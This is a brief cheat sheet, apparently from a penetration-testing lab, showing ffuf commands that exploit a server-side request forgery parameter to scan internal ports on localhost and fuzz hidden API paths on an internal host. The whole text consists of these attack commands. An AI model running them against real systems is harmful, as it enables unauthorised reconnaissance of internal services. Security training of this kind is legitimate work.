
Create A Word List of Ports
```shell-session
seq 1 10000 > ports.txt
```

Command using SSRF to port scan a service
```shell-session
ffuf -w ./ports.txt -u http://IP/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
```

Command using SSRF to fuzz directories
```shell-session
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://IP/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "api=http://truckapi.htb/FUZZ.php?id%3DFusionExpress01"
```